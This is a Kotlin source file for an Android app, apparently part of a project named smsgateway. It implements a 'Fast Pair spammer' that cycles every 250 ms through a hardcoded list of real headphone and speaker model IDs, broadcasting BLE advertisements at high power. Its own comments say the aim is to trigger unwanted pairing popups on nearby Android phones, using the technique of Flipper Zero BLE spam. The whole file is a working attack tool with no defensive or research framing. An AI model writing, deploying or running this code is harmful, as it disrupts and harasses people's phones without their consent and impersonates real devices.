package com.sunfeld.smsgateway

import android.bluetooth.BluetoothAdapter
import android.bluetooth.BluetoothManager
import android.bluetooth.le.AdvertiseCallback
import android.bluetooth.le.AdvertiseData
import android.bluetooth.le.AdvertiseSettings
import android.bluetooth.le.BluetoothLeAdvertiser
import android.content.Context
import android.os.ParcelUuid
import android.util.Log
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import java.util.UUID

/**
 * Google Fast Pair protocol spammer.
 *
 * Triggers the half-sheet popup notification on nearby Android phones by
 * broadcasting BLE advertisements with Service UUID 0xFE2C and a 3-byte
 * model ID matching known Fast Pair devices (headphones, speakers, etc.).
 *
 * This is the same technique used by Flipper Zero BLE spam.
 *
 * Packet structure (per BLE spec):
 *   AD1: Service UUID List  -> 0x2C 0xFE (Fast Pair)
 *   AD2: Service Data       -> 0x2C 0xFE + 3-byte model ID
 *   AD3: TX Power Level     -> variable
 */
class FastPairSpammer {

    companion object {
        private const val TAG = "FastPairSpam"

        // Google Fast Pair Service UUID
        private val FAST_PAIR_UUID = ParcelUuid(
            UUID.fromString("0000FE2C-0000-1000-8000-00805f9b34fb")
        )

        private const val CYCLE_INTERVAL_MS = 250L

        // Known Fast Pair model IDs (3 bytes each) — these trigger real popup notifications
        // Each represents a real registered device that Android recognizes
        val MODEL_IDS: List<Triple<String, Int, Int>> = listOf(
            // name, modelId (24-bit), second half for byte extraction
            Triple("Bose NC 700",          0xCD8256, 0),
            Triple("JBL Buds Pro",         0xF52494, 0),
            Triple("JBL Live 300TWS",      0x718FA4, 0),
            Triple("JBL Flip 6",           0x821F66, 0),
            Triple("Pixel Buds",           0x92BBBD, 0),
            Triple("Pixel Buds Pro",       0xD446A7, 0),
            Triple("Pixel Buds A-Series",  0x90B691, 0),
            Triple("Sony WF-1000XM4",      0x8B66AB, 0),
            Triple("Sony WH-1000XM5",      0x5765B5, 0),
            Triple("Samsung Buds Pro",     0xEEB4A8, 0),
            Triple("Samsung Buds Live",    0x9AB0F6, 0),
            Triple("Samsung Buds2",        0xA59076, 0),
            Triple("Samsung Buds FE",      0xCD5401, 0),
            Triple("Beats Studio Buds",    0xA76231, 0),
            Triple("Beats Fit Pro",        0xA2C9D9, 0),
            Triple("Nothing Ear 1",        0x87B0F1, 0),
            Triple("Nothing Ear 2",        0xF1B0F2, 0),
            Triple("OnePlus Buds Pro",     0xD5B5C3, 0),
            Triple("Google Nest Mini",     0x0082DA, 0),
            Triple("JBL Charge 5",         0x749AAB, 0),
            Triple("Bose QC Earbuds",      0xF75231, 0),
            Triple("LG Tone Free",         0xB5E5A1, 0),
            Triple("Jabra Elite 85t",      0xC9BD45, 0),
            Triple("Skullcandy Indy",      0x12F4A3, 0),
        )
    }

    private val _spamCount = MutableStateFlow(0)
    val spamCount: StateFlow<Int> = _spamCount.asStateFlow()

    private val _isRunning = MutableStateFlow(false)
    val isRunning: StateFlow<Boolean> = _isRunning.asStateFlow()

    private var advertiser: BluetoothLeAdvertiser? = null
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var spamJob: Job? = null
    private var currentCallback: AdvertiseCallback? = null

    /** Extract 3-byte model ID from a 24-bit integer */
    private fun modelIdBytes(modelId: Int): ByteArray = byteArrayOf(
        ((modelId shr 16) and 0xFF).toByte(),
        ((modelId shr 8) and 0xFF).toByte(),
        (modelId and 0xFF).toByte()
    )

    /**
     * Start Fast Pair spam — rapidly cycles through device model IDs,
     * broadcasting each as a BLE advertisement that triggers the Android
     * Fast Pair half-sheet notification popup.
     */
    fun start(context: Context) {
        val btManager = context.getSystemService(Context.BLUETOOTH_SERVICE) as? BluetoothManager
        val adapter = btManager?.adapter

        if (adapter == null || adapter.isEnabled != true) {
            Log.e(TAG, "Bluetooth not available")
            return
        }

        advertiser = adapter.bluetoothLeAdvertiser
        if (advertiser == null) {
            Log.e(TAG, "BLE advertiser not available")
            return
        }

        _isRunning.value = true
        _spamCount.value = 0

        spamJob = scope.launch {
            while (isActive) {
                // Pick a random model ID each cycle
                val (name, modelId, _) = MODEL_IDS.random()
                val data = modelIdBytes(modelId)

                try {
                    // Stop previous advertisement
                    stopCurrentAd()

                    // Build Fast Pair advertisement
                    val settings = AdvertiseSettings.Builder()
                        .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
                        .setTxPowerLevel(AdvertiseSettings.ADVERTISE_TX_POWER_HIGH)
                        .setConnectable(true)
                        .setTimeout(0)
                        .build()

                    val advertiseData = AdvertiseData.Builder()
                        .addServiceUuid(FAST_PAIR_UUID)
                        .addServiceData(FAST_PAIR_UUID, data)
                        .setIncludeTxPowerLevel(true)
                        .setIncludeDeviceName(false) // Fast Pair doesn't use device name
                        .build()

                    val callback = object : AdvertiseCallback() {
                        override fun onStartSuccess(settingsInEffect: AdvertiseSettings) {
                            _spamCount.value++
                            Log.d(TAG, "Fast Pair ad #${_spamCount.value}: $name (0x${String.format("%06X", modelId)})")
                        }

                        override fun onStartFailure(errorCode: Int) {
                            Log.w(TAG, "Fast Pair ad failed: $errorCode")
                        }
                    }
                    currentCallback = callback

                    advertiser?.startAdvertising(settings, advertiseData, callback)

                    delay(CYCLE_INTERVAL_MS)
                } catch (e: SecurityException) {
                    Log.e(TAG, "SecurityException", e)
                    delay(500)
                } catch (e: Exception) {
                    Log.e(TAG, "Error in spam cycle", e)
                    delay(500)
                }
            }
        }

        CrashLogger.log(context, TAG, "Fast Pair spam started (${MODEL_IDS.size} model IDs)")
    }

    private fun stopCurrentAd() {
        currentCallback?.let { cb ->
            try {
                advertiser?.stopAdvertising(cb)
            } catch (_: Exception) { }
        }
        currentCallback = null
    }

    fun stop() {
        _isRunning.value = false
        spamJob?.cancel()
        stopCurrentAd()
        Log.d(TAG, "Fast Pair spam stopped")
    }
}
